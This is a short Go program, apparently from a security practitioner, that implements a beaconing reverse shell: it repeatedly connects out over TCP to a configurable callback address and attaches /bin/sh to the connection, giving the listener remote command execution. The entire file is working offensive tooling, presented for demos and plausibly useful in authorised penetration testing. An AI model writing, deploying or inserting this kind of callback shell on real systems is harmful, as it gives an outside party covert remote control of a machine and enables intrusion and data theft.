// demoshell is a nifty beaconing shell useful for demos
package main

/*
 * demoshell.go
 * Simple reverse shell used in demos
 * By J. Stuart McMurray
 * Created 20180331
 * Last Modified 20180331
 */

import (
        "flag"
        "fmt"
        "log"
        "net"
        "os"
        "os/exec"
        "time"
)

/* Verbose logger */
var vlog = log.Printf

func main() {
        var (
                addr = flag.String(
                        "addr",
                        "127.0.0.1:4444",
                        "Callback `adress`",
                )
                sleep = flag.Duration(
                        "sleep",
                        2*time.Second,
                        "Sleep `duration` between callbacks",
                )
                verbose = flag.Bool(
                        "v",
                        false,
                        "Print message for each connection",
                )
        )
        flag.Usage = func() {
                fmt.Fprintf(
                        os.Stderr,
                        `Usage %v [options]
Calls the address every so often and hooks up a shell to the network
connection.
Options:
`,
                        os.Args[0],
                )
                flag.PrintDefaults()
        }
        flag.Parse()

        /* Unverbose just disables extra logging */
        if !*verbose {
                vlog = func(string, ...interface{}) {}
        }

        log.Printf("Starting shell callbacks to %v", *addr)

        for {
                /* Try to make a shell */
                if err := shell(*addr); nil != err {
                        vlog("Error: %v", err)
                }
                /* Sleep until the next one */
                time.Sleep(*sleep)
        }
}

/* shell connects to addr and hands it a shell */
func shell(addr string) error {
        /* Try to connect */
        c, err := net.Dial("tcp", addr)
        if nil != err {
                return err
        }
        vlog("Connected %v->%v", c.LocalAddr(), c.RemoteAddr())
        defer c.Close()

        /* Make a shell to hook up */
        s := exec.Command("/bin/sh")
        s.Stdin = c
        s.Stdout = c
        s.Stderr = c

        /* Welcome the user */
        fmt.Fprintf(c, "Welcome!\n")

        /* Start the shell */
        return s.Run()
}